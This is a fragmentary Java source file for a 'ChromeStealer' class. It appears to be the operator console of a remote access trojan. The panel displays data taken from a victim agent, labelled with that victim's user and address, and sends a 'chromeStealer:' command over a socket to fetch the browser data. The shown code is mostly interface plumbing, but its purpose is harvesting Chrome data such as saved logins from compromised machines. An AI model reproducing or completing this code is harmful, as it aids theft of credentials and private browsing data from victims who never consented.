...
public class ChromeStealer {
    ...
    public ChromeStealer(final ControllerBuilder controllerBuilder) {
    ...
    public void open() {
        ...
        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Chrome Stealer | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        ...
        copyButton.setOnMouseClicked(event -> {
            ...
            this.master.getNotification().notify("Chrome Stealer", "Data were successfully copied");
        });
    ...
    private void createContextMenu() {
        ...
        copyItem.setOnAction(event -> {
            ...
            this.master.getNotification().notify("Chrome Stealer", "Row data was successfully copied");
        });
    ...
    private void sendListRequest() {
        ...
        this.waiting.add(id);
        this.master.getSocketUtils().write(this.agentData.getId(), "chromeStealer:" + id);
    }
